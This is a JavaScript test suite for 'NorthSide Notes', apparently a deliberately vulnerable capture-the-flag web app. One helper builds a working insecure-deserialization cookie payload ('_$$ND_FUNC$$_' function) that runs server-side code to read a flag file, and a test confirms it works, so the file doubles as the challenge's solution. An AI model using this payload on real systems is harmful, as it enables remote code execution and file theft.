const request = require('supertest');
const fs = require('fs');
const path = require('path');

// Set test env before requiring app
process.env.NODE_ENV = 'test';
const app = require('../src/app');

const USERS_PATH = path.join(__dirname, '..', 'src', 'data', 'users.json');
const FLAGS_PATH = path.join(__dirname, '..', 'src', 'data', 'flags.json');

function getFirstUser() {
  const users = JSON.parse(fs.readFileSync(USERS_PATH, 'utf8'));
  const username = Object.keys(users)[0];
  return { username, password: users[username].password };
}

function getFlag(username) {
  const flags = JSON.parse(fs.readFileSync(FLAGS_PATH, 'utf8'));
  return flags[username];
}

function makeNormalProfileCookie(username) {
  const profile = { username, theme: 'light', lastVisit: new Date().toISOString() };
  return Buffer.from(JSON.stringify(profile)).toString('base64');
}

function makeExploitCookie(username) {
  const payload = {
    username: `_$$ND_FUNC$$_function(){return require('fs').readFileSync('${path.join(__dirname, '..', 'src', 'data', 'flag-files', username + '.txt')}','utf8').trim()}()`,
    theme: 'light',
    lastVisit: new Date().toISOString(),
  };
  return Buffer.from(JSON.stringify(payload)).toString('base64');
}

describe('NorthSide Notes', () => {
  test('GET /home without profile cookie redirects to login', async () => {
    const res = await request(app).get('/home');
    expect(res.status).toBe(302);
    expect(res.headers.location).toBe('/');
  });

  test('GET /home with normal profile cookie renders username', async () => {
    const { username } = getFirstUser();
    const cookie = makeNormalProfileCookie(username);

    const res = await request(app)
      .get('/home')
      .set('Cookie', `profile=${cookie}`);

    expect(res.status).toBe(200);
    expect(res.text).toContain(`Welcome back, ${username}`);
  });

  test('GET /home with IIFE exploit cookie renders flag', async () => {
    const { username } = getFirstUser();
    const flag = getFlag(username);
    const cookie = makeExploitCookie(username);

    const res = await request(app)
      .get('/home')
      .set('Cookie', `profile=${cookie}`);

    expect(res.status).toBe(200);
    expect(res.text).toContain(flag);
  });

  test('GET /flag returns red herring page', async () => {
    const res = await request(app).get('/flag');
    expect(res.status).toBe(200);
    expect(res.text).toContain('Nothing here yet');
    expect(res.text).not.toContain('durham-ds{');
  });

  test('POST /login with wrong password returns 401', async () => {
    const { username } = getFirstUser();

    const res = await request(app)
      .post('/login')
      .type('form')
      .send({ username, password: 'wrongpassword' });

    expect(res.status).toBe(401);
    expect(res.text).toContain('Invalid username or password');
  });

  test('GET /note/:id with non-numeric id returns 400', async () => {
    const { username } = getFirstUser();
    const cookie = makeNormalProfileCookie(username);

    const res = await request(app)
      .get('/note/abc')
      .set('Cookie', `profile=${cookie}`);

    expect(res.status).toBe(400);
  });

  test('POST /login with correct credentials redirects to /home and sets profile cookie', async () => {
    const { username, password } = getFirstUser();
    const res = await request(app)
      .post('/login')
      .type('form')
      .send({ username, password });
    expect(res.status).toBe(302);
    expect(res.headers.location).toBe('/home');
    const setCookie = (res.headers['set-cookie'] || []).join(';');
    expect(setCookie).toMatch(/profile=/);
  });

  test('GET /home with malformed profile cookie does not crash', async () => {
    const res = await request(app)
      .get('/home')
      .set('Cookie', 'profile=not-valid-base64%%%');
    expect([200, 302, 400]).toContain(res.status);
  });
});
